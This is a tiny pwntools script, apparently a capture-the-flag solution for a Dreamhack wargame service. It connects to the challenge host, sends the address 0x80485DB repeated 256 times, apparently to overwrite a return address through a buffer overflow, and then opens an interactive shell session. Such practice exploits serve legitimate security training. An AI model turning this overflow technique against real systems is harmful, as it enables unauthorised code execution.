from pwn import *

p = remote('host1.dreamhack.games', 8523)

p.sendline(p32(0x80485DB)*0x100)
p.interactive()
